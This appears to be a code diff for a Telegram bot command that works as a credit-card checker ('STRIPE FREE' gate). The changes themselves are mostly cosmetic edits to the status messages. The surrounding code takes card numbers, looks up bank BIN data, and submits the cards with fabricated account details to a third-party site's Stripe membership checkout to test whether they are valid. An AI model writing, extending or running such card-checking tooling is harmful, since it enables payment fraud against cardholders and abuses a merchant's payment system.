@@ -19,9 +19,6 @@ headers = {
 
 
 
-
-
-
 @Client.on_message(filters.command(["ca"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
 async def ca(Client, message):
     try:
@@ -33,8 +30,8 @@ async def ca(Client, message):
         else:
             text = f"""
 <b>〄</b> GATE: <b>STRIPE FREE [1]</b>
-<b>○</b> PROCESS: <b>□□□□□□□□□□ 0% </b>
-<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
+<b>ᗚ</b> PROCESS: <b>□□□□□□□□□□ 0% </b>
+<b>ᗚ</b> TIME TAKING: {get_time_taken(started_time)}'s
 
 <b>♻️</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
 <b>🧑🏻‍💻| BOT BY: @MrItzMe</b>"""
@@ -136,27 +133,26 @@ async def ca(Client, message):
                                 if 'error' in json_first:
                                     text = f"""
 <b>〄</b> GATE: <b>STRIPE FREE [1]</b>
-<b>○</b> INPUT: <code>{lista}</code>
-<b>○</b> RESULT: <b>REJECTED❌ [INCORRECT CARD]</b>
-<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
-<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
-<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
+<b>ᗚ</b> INPUT: <code>{lista}</code>
+<b>ᗚ</b> RESULT: <b>REJECTED❌ [INCORRECT CARD]</b>
+<b>ᗚ</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
+<b>ᗚ</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
+<b>ᗚ</b> TIME TAKING: {get_time_taken(started_time)}'s
 
-<b>♻️</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
+<b>♻️</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
 <b>🧑🏻‍💻| BOT BY: @MrItzMe</b>"""
                                     await msg.edit_text(text)
                                     antidb.set(message.from_user.id, int(time.time()))
                                 elif 'id' not in json_first:
                                     text = f"""
 <b>〄</b> GATE: <b>STRIPE FREE [1]</b>
-<b>○</b> INPUT: <code>{lista}</code>
-<b>○</b> RESULT: <b>REJECTED❌ [ERROR]</b>
-<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
-<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
-<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
-<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
+<b>ᗚ</b> INPUT: <code>{lista}</code>
+<b>ᗚ</b> RESULT: <b>REJECTED❌ [ERROR]</b>
+<b>ᗚ</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
+<b>ᗚ</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
+<b>ᗚ</b> TIME TAKING: {get_time_taken(started_time)}'s
 
-<b>♻️</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
+<b>♻️</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
 <b>🧑🏻‍💻| BOT BY: @MrItzMe</b>"""
                                     await msg.edit_text(text)
                                     antidb.set(message.from_user.id, int(time.time()))
@@ -164,28 +160,26 @@ async def ca(Client, message):
                                     id = json_first["id"]
                                     text = f"""
 <b>〄</b> GATE: <b>STRIPE FREE [1]</b>
-<b>○</b> INPUT: <code>{lista}</code>
-<b>○</b> PROCESS: <b>■■■■■□□□□□ 50%</b>
-<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
-<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
-<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
-<b>○</b> TIME TAKING: {get_time_taken(started_time)}'s
+<b>ᗚ</b> INPUT: <code>{lista}</code>
+<b>ᗚ</b> PROCESS: <b>■■■■■□□□□□ 50%</b>
+<b>ᗚ</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
+<b>ᗚ</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
+<b>ᗚ</b> TIME TAKING: {get_time_taken(started_time)}'s
 
-<b>♻️</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
+<b>♻️</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
 <b>🧑🏻‍💻| BOT BY: @MrItzMe</b>"""
                                     await msg.edit_text(text)
                                     data = f"level=8&levelstodel=&checkjavascript=1&other_discount_code=&username={get_username()}&password={password}&password2={password}&first_name={first_name}&last_name={last_name}&bemail={email}&bconfirmemail={email}&fullname=&gateway=stripe&CardType={vendor}&discount_code=&submit-checkout=1&javascriptok=1&javascriptok=1&payment_method_id={id}&AccountNumber={cc}&ExpirationMonth={mes}&ExpirationYear=ano"
                                     res = curl.post("https://my.smashgo.co/account/membership-checkout/?level=8",headers=headers,data=data)
                                     text = f"""
 <b>〄</b> GATE: <b>STRIPE FREE [1]</b>
-<b>○</b> INPUT: <code>{lista}</code>
-<b>○</b> PROCESS: <b>■■■■■■■■■■ 100%</b>
-<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
-<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
-<b>○</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
-<b>○</b> TIME TAKING: <b>{get_time_taken(started_time)}'s</b>
+<b>ᗚ</b> INPUT: <code>{lista}</code>
+<b>ᗚ</b> PROCESS: <b>■■■■■■■■■■ 100%</b>
+<b>ᗚ</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
+<b>ᗚ</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
+<b>ᗚ</b> TIME TAKING: <b>{get_time_taken(started_time)}'s</b>
 
-<b>♻️</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
+<b>♻️</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
 <b>🧑🏻‍💻| BOT BY: @MrItzMe</b>"""
                                     await msg.edit_text(text)
                                     try:
@@ -260,14 +254,13 @@ async def ca(Client, message):
                                         else:
                                             lasttext = f"""
 <b>〄</b> GATE: <b>STRIPE FREE [1]</b>
-<b>○</b> INPUT: <code>{lista}</code>
-<b>○</b> RESULT: <b>{response}{r_logo} [{r_text}]</b>
-<b>○</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
-<b>○</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
-<b>○</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
-<b>○</b> TIME TAKEN: {get_time_taken(started_time)}'s
+<b>ᗚ</b> INPUT: <code>{lista}</code>
+<b>ᗚ</b> RESULT: <b>{response}{r_logo} [{r_text}]</b>
+<b>ᗚ</b> BANK INFO: <b>{bin_data['data']['bank']} - {bin_data['data']['countryInfo']['code']}({bin_data['data']['countryInfo']['emoji']})</b>
+<b>ᗚ</b> BIN INFO: <code>{bin}</code> - <b>{bin_data['data']['level']}</b> - <b>{bin_data['data']['type']}</b>
+<b>ᗚ</b> TIME TAKEN: {get_time_taken(started_time)}'s
 
-<b>♻️</b> CHECKING BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>
+<b>♻️</b> CHECKED BY: <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a> [<i>{find['role']}</i>]</b>
 <b>🧑🏻‍💻| BOT BY: @MrItzMe</b>"""
                                         await msg.edit_text(lasttext)
                                         antidb.set(message.from_user.id, int(time.time()))
